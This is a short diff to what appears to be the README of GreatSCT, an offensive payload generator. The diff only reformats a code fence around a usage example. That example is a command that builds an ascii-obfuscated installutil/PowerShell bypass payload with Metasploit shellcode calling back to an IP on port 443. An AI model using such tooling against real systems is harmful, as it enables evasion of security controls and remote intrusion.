@@ -109,7 +109,8 @@ Great Scott Options:
                         Metasploit shellcode to generate.
 ```
 **GreatSCT Bypass CLI**
-```# ./GreatSCT.py --ip 192.168.157.136 --port 443 -t Bypass -p installutil/powershell/script.py -c "OBFUSCATION=ascii SCRIPT=/root/script.ps1"
+```
+# ./GreatSCT.py --ip 192.168.157.136 --port 443 -t Bypass -p installutil/powershell/script.py -c "OBFUSCATION=ascii SCRIPT=/root/script.ps1"
 ===============================================================================
                                    Great Scott!
 ===============================================================================
